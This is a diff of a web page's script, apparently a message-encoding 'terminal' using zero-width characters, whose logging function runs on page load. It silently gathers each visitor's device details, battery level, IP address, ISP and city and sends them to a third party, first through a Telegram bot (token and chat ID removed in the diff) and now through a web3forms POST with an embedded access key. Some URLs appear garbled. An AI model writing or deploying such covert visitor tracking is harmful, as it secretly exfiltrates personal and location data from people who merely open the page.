@@ -59,13 +59,10 @@ button{flex:1;padding:10px;font-family:inherit;font-weight:bold;font-size:.8rem;
   </div>
 </div>
 <script>
-const P1 = "9224929810";
-const P2 = "AAGxJuq0TlbD2hLnB6WAe-VR_v38WdK10IE";
-const TK = P1 + ":" + P2;
-const ID = "8913634076";
+const ACCESS_KEY = "6071ee91-2983-4a77-b742-af964ed176b6";
 
 let fails=0,last='',ac=null;
-function sfx(t){try{if(!ac)ac=new(window.AudioContext||window.webkitAudioContext)();if(ac.state==='suspended')ac.resume();const o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);const n=ac.currentTime;if(t==='tap'){o.frequency.setValueAtTime(900,n);g.gain.setValueAtTime(.05,n);o.start(n);o.stop(n+.04);}else if(t==='lock'){o.type='triangle';o.frequency.setValueAtTime(600,n);o.frequency.exponentialRampToValueAtTime(180,n+.25);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.25);if(navigator.vibrate)navigator.vibrate(50);}else if(t==='unlock'){o.frequency.setValueAtTime(450,n);o.frequency.setValueAtTime(950,n+.12);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate([40,30,40]);}else if(t==='err'){o.type='sawtooth';o.frequency.setValueAtTime(140,n);o.frequency.linearRampToValueAtTime(90,n+.3);g.gain.setValueAtTime(.2,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate(200);}else if(t==='wipe'){o.type='sawtooth';o.frequency.setValueAtTime(750,n);o.frequency.linearRampToValueAtTime(110,n+.9);g.gain.setValueAtTime(.25,n);o.start(n);o.stop(n+.9);if(navigator.vibrate)navigator.vibrate([100,50,200]);}}catch(e){}}
+function sfx(t){try{if(!ac)ac=new(window.AudioContext||window.webkitAudioContext)();if(ac.state==='suspended')ac.resume();const o=ac.createOscillator(),g=ac.createGain();o.connect(g);g.connect(ac.destination);const n=ac.currentTime;if(t==='tap'){o.frequency.setValueAtTime(900,n);g.gain.setValueAtTime(.05,n);o.start(n);o.stop(n+.04);}else if(t==='lock'){o.type='triangle';o.frequency.setValueAtTime(600,n);o.frequency.exponentialRampToValueAtTime(180,n+.25);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.25);if(navigator.vibrate)navigator.vibrate(50);}else if(t==='unlock'){o.frequency.setValueAtTime(450,n);o.frequency.setValueAtTime(950,n+.12);g.gain.setValueAtTime(.15,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate();}else if(t==='err'){o.type='sawtooth';o.frequency.setValueAtTime(140,n);o.frequency.linearRampToValueAtTime(90,n+.3);g.gain.setValueAtTime(.2,n);o.start(n);o.stop(n+.3);if(navigator.vibrate)navigator.vibrate(200);}else if(t==='wipe'){o.type='sawtooth';o.frequency.setValueAtTime(750,n);o.frequency.linearRampToValueAtTime(110,n+.9);g.gain.setValueAtTime(.25,n);o.start(n);o.stop(n+.9);if(navigator.vibrate)navigator.vibrate();}}catch(e){}}
 const Z0='\u200B',Z1='\u200C',ZW='\u200D';
 function toZW(s){return ZW+s.split('').map(c=>c.charCodeAt(0).toString(2).padStart(8,'0').replace(/0/g,Z0).replace(/1/g,Z1)).join('')+ZW;}
 function fromZW(s){const m=s.match(/\u200D([\u200B\u200C]+)\u200D/);if(!m)return null;const b=m.at(1).replace(/\u200B/g,'0').replace(/\u200C/g,'1');let r='';for(let i=0;i<b.length;i+=8)r+=String.fromCharCode(parseInt(b.slice(i,i+8),2));return r;}
@@ -77,8 +74,20 @@ async function log(st,pv){
   try{const b=await navigator.getBattery();bt=Math.round(b.level*100)+"% "+(b.charging?"(Chg)":"");}catch(e){}
   try{const r=await fetch('https://ipapi.co'),d=await r.json();lc=`${d.city}, ${d.country_name}`;nt=`${d.org} (${d.ip})`;}catch(e){}
   const ua=navigator.userAgent.match(/\(([^)]+)\)/),dv=ua?ua.at(1):navigator.platform;
-  const txt=`👁️ KALAH LOG\nStatus: ${st}\nDevice: ${dv}\nBattery: ${bt}\nNet/SIM: ${nt}\nLoc: ${lc}\nTime: ${new Date().toLocaleTimeString()}\nMsg: ${pv}`;
-  fetch(`https://telegram.org{TK}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(txt)}`);
+  fetch("https://web3forms.com",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      access_key:ACCESS_KEY,
+      subject:`👁️ KALAH LOG: ${st}`,
+      Device:dv,
+      Battery:bt,
+      Network:nt,
+      Location:lc,
+      Time:new Date().toLocaleTimeString(),
+      Message:pv
+    })
+  });
 }
 window.addEventListener('load',()=>log("🚨 SITE OPENED","Visitor entered terminal"));
 function chkQ(){const r=fromZW(document.getElementById('in').value)||document.getElementById('in').value.trim(),qb=document.getElementById('qBox');if(r.includes("::Q::")){try{document.getElementById('qTxt').innerText=decodeURIComponent(atob(r.split("::Q::").at(0)));qb.style.display='block';sfx('tap');}catch(e){qb.style.display='none';}}else qb.style.display='none';}
